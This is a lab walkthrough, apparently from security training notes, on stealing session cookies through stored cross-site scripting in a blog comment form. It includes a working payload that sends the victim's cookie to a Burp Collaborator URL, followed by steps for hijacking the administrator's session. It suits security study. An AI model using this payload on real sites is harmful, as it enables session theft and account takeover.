## üç™ Using Cross-Site Scripting for Cookie Theft

Cookie theft is a traditional method of exploiting XSS. Most web applications use cookies to manage sessions. You can leverage cross-site scripting vulnerabilities to send the victim's cookies to your domain and then manually inject these cookies into your browser to impersonate the victim.

### Practical Limitations:

1. The victim might not be logged in.
2. Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
3. Sessions might be locked by additional factors, such as the user's IP address.
4. The session might expire before you manage to intercept it.

### üî¨ Example Lab: Exploiting a Stored XSS Vulnerability
This lab contains a stored XSS vulnerability in the blog comment feature. A simulated victim user views all comments after they are posted. To solve this lab, exploit the vulnerability to extract the victim's session cookie and use it to impersonate the victim.

### Steps:

1. Navigate to any post and locate the comment form at the bottom of the page:

   ![image](https://github.com/user-attachments/assets/6729768d-caae-4d96-8350-4b9f93340407)![image](https://github.com/user-attachments/assets/d9982d81-88db-4261-b408-f54eaf6bd9a5)

2. Enter random values in the form and add the following payload to the comment:

   ```html
   <img src=x onerror=this.src='http://burp.collaborator.url/?c='+document.cookie>
   ```

3. Go to the Collaborator tab and click "Poll now." You should see an HTTP interaction. If nothing appears, wait a few seconds and try again.

   ![image](https://github.com/user-attachments/assets/42799ca7-4967-4a3c-9830-6d3c89f19847)

4. Note the victim's cookie value in the body of the POST request:

   ![image](https://github.com/user-attachments/assets/f6106c1e-e2d0-4903-ab3d-e04cd09240ce)

5. Reload the blog's main page using Burp Proxy or Burp Repeater. Replace your own session cookie with the one captured via Burp Collaborator. Submit a request to solve the lab. To prove you have successfully hijacked the administrator user's session, use the same cookie in a request to `/my-account` to load the administrator's account page.
